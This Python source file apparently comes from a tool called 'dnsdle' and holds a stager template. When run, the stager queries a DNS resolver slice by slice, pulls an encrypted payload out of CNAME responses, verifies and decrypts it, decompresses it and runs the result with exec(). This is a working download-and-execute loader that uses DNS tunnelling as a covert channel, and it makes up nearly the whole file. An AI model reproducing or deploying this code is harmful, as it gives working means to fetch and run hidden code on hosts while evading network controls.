from __future__ import absolute_import, unicode_literals


_STAGER_TEMPLATE = '''#!/usr/bin/env python
# -*- coding: ascii -*-
import base64
import hashlib
import hmac
import random
import socket
import struct
import sys
import zlib

DOMAIN_LABELS = @@DOMAIN_LABELS@@
FILE_TAG = @@FILE_TAG@@
FILE_ID = @@FILE_ID@@
PUBLISH_VERSION = @@PUBLISH_VERSION@@
TOTAL_SLICES = @@TOTAL_SLICES@@
COMPRESSED_SIZE = @@COMPRESSED_SIZE@@
PLAINTEXT_SHA256_HEX = @@PLAINTEXT_SHA256_HEX@@
SLICE_TOKENS = @@SLICE_TOKENS@@
RESPONSE_LABEL = @@RESPONSE_LABEL@@
DNS_EDNS_SIZE = @@DNS_EDNS_SIZE@@


# Ensure ASCII bytes
def _ab(v):
    if isinstance(v, bytes):
        return v
    return v.encode("ascii")


# Ensure UTF-8 bytes
def _ub(v):
    if isinstance(v, bytes):
        return v
    return v.encode("utf-8")


# Integer to ASCII bytes
def _ib(v):
    return _ab(str(int(v)))


# Encode DNS name to wire format
def _encode_name(labels):
    parts = []
    for label in labels:
        raw = _ab(label)
        parts.append(struct.pack("!B", len(raw)))
        parts.append(raw)
    parts.append(b"\\x00")
    return b"".join(parts)


# Decode DNS name from wire format with pointer decompression
def _decode_name(msg, off):
    ba = bytearray(msg)
    labels = []
    jumped = False
    end = None
    visited = set()
    while True:
        first = ba[off]
        if (first & 0xC0) == 0xC0:
            ptr = ((first & 0x3F) << 8) | ba[off + 1]
            if ptr in visited:
                raise ValueError("loop", ptr)
            visited.add(ptr)
            if not jumped:
                end = off + 2
                jumped = True
            off = ptr
            continue
        if first & 0xC0:
            raise ValueError("ltype", first)
        off += 1
        if first == 0:
            break
        eo = off + first
        label = "".join(chr(ba[j]) for j in range(off, eo)).lower()
        labels.append(label)
        off = eo
    return tuple(labels), (end if jumped else off)


# Build DNS query for QTYPE A with optional EDNS OPT record
def _build_query(qid, labels):
    qname = _encode_name(labels)
    question = qname + struct.pack("!HH", 1, 1)
    use_edns = DNS_EDNS_SIZE > 512
    arcount = 1 if use_edns else 0
    header = struct.pack("!HHHHHH", qid & 0xFFFF, 0x0100, 1, 0, 0, arcount)
    pkt = header + question
    if use_edns:
        pkt += b"\\x00" + struct.pack("!HHIH", 41, DNS_EDNS_SIZE, 0, 0)
    return pkt


# Parse DNS response and extract CNAME target labels
def _parse_cname(msg, qid, qname_labels):
    rid, flags, qdcount, ancount = struct.unpack("!HHHH", msg[:8])
    if rid != (qid & 0xFFFF):
        raise ValueError("id", rid, qid & 0xFFFF)
    if not (flags & 0x8000):
        raise ValueError("qr", flags)
    if flags & 0x0200:
        raise ValueError("tc", flags)
    if flags & 0x7800:
        raise ValueError("op", flags)
    if (flags & 0x000F) != 0:
        raise ValueError("rc", flags & 0xF)
    if qdcount != 1:
        raise ValueError("qd", qdcount)
    off = 12
    _qlabels, off = _decode_name(msg, off)
    off += 4
    expected = tuple(qname_labels)
    cname = None
    for _i in range(ancount):
        rr_name, off = _decode_name(msg, off)
        rr_type, rr_class, _ttl, rdlen = struct.unpack("!HHIH", msg[off:off + 10])
        off += 10
        rdata_off = off
        off += rdlen
        if rr_type == 5 and rr_class == 1 and rr_name == expected:
            cname, _ce = _decode_name(msg, rdata_off)
    if cname is None:
        raise ValueError("no_cname", ancount)
    return cname


# Extract payload text from CNAME target
def _extract_payload(cname_labels):
    suffix = (RESPONSE_LABEL,) + tuple(DOMAIN_LABELS)
    slen = len(suffix)
    if len(cname_labels) <= slen:
        raise ValueError("short_cname", cname_labels)
    if tuple(cname_labels[-slen:]) != suffix:
        raise ValueError("bad_suffix", cname_labels)
    return "".join(cname_labels[:-slen])


# Base32 decode with no-padding lowercase alphabet
def _b32d(text):
    upper = text.upper()
    pad = (8 - len(upper) % 8) % 8
    return base64.b32decode(_ab(upper + "=" * pad))


# Derive encryption key from PSK
def _enc_key(pk):
    msg = b"dnsdle-enc-v1|" + _ab(FILE_ID) + b"|" + _ab(PUBLISH_VERSION)
    return hmac.new(pk, msg, hashlib.sha256).digest()


# Derive MAC key from PSK
def _mac_key(pk):
    msg = b"dnsdle-mac-v1|" + _ab(FILE_ID) + b"|" + _ab(PUBLISH_VERSION)
    return hmac.new(pk, msg, hashlib.sha256).digest()


# Generate XOR keystream
def _keystream(ek, si, length):
    blocks = []
    produced = 0
    counter = 0
    si_b = _ib(si)
    fi_b = _ab(FILE_ID)
    pv_b = _ab(PUBLISH_VERSION)
    while produced < length:
        cb = _ib(counter)
        inp = b"dnsdle-enc-stream-v1|" + fi_b + b"|" + pv_b + b"|" + si_b + b"|" + cb
        block = hmac.new(ek, inp, hashlib.sha256).digest()
        blocks.append(block)
        produced += len(block)
        counter += 1
    return b"".join(blocks)[:length]


# XOR two equal-length byte strings
def _xor(left, right):
    la = bytearray(left)
    ra = bytearray(right)
    out = bytearray(len(la))
    for i in range(len(la)):
        out[i] = la[i] ^ ra[i]
    return bytes(out)


# Constant-time byte comparison
def _secure_compare(left, right):
    fn = getattr(hmac, "compare_digest", None)
    if fn:
        return fn(left, right)
    la = bytearray(left)
    ra = bytearray(right)
    if len(la) != len(ra):
        return False
    r = 0
    for i in range(len(la)):
        r |= la[i] ^ ra[i]
    return r == 0


# Compute truncated MAC for a slice
def _expected_mac(mk, si, ciphertext):
    msg = b"dnsdle-mac-msg-v1|"
    msg += _ab(FILE_ID) + b"|" + _ab(PUBLISH_VERSION)
    msg += b"|" + _ib(si)
    msg += b"|" + _ib(TOTAL_SLICES)
    msg += b"|" + _ib(COMPRESSED_SIZE)
    msg += b"|" + ciphertext
    return hmac.new(mk, msg, hashlib.sha256).digest()[:8]


# Parse binary record, verify MAC, decrypt slice
def _process_slice(ek, mk, si, payload_text):
    record = _b32d(payload_text)
    ba = bytearray(record)
    if ba[0] != 0x01:
        raise ValueError("ver", ba[0])
    if ba[1] != 0x00:
        raise ValueError("rsvd", ba[1])
    clen = struct.unpack("!H", record[2:4])[0]
    if clen == 0:
        raise ValueError("zero_ct")
    if 4 + clen + 8 != len(record):
        raise ValueError("rec_sz", len(record), 4 + clen + 8)
    ciphertext = record[4:4 + clen]
    mac = record[4 + clen:]
    em = _expected_mac(mk, si, ciphertext)
    if not _secure_compare(em, mac):
        raise ValueError("mac", si)
    stream = _keystream(ek, si, clen)
    return _xor(ciphertext, stream)


# Send DNS query over UDP and return response
def _send_query(addr, pkt):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.settimeout(5.0)
        sock.sendto(pkt, addr)
        resp, _src = sock.recvfrom(max(2048, DNS_EDNS_SIZE + 2048))
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return resp

# __RUNTIME__
resolver = sys.argv[1]
psk = sys.argv[2]
extra = sys.argv[3:]
host = resolver
port = 53
if ":" in resolver:
    host, _port_s = resolver.rsplit(":", 1)
    port = int(_port_s)
addr = (host, port)
pk = _ub(psk)
ek = _enc_key(pk)
mk = _mac_key(pk)
slices = {}
for si in range(TOTAL_SLICES):
    qname = (SLICE_TOKENS[si], FILE_TAG) + tuple(DOMAIN_LABELS)
    qid = random.randint(0, 0xFFFF)
    pkt = _build_query(qid, qname)
    resp = _send_query(addr, pkt)
    cname = _parse_cname(resp, qid, qname)
    payload = _extract_payload(cname)
    slices[si] = _process_slice(ek, mk, si, payload)
compressed = b"".join(slices[i] for i in range(TOTAL_SLICES))
if len(compressed) != COMPRESSED_SIZE:
    raise ValueError("sz", len(compressed), COMPRESSED_SIZE)
plaintext = zlib.decompress(compressed)
if hashlib.sha256(plaintext).hexdigest().lower() != PLAINTEXT_SHA256_HEX:
    raise ValueError("sha256")
client_source = plaintext
if not isinstance(client_source, str):
    client_source = client_source.decode("ascii")
sys.argv = ["s", "--psk", psk, "--resolver", resolver] + extra
exec(client_source)
'''


def build_stager_template():
    """Return the stager template source as a string."""
    return _STAGER_TEMPLATE
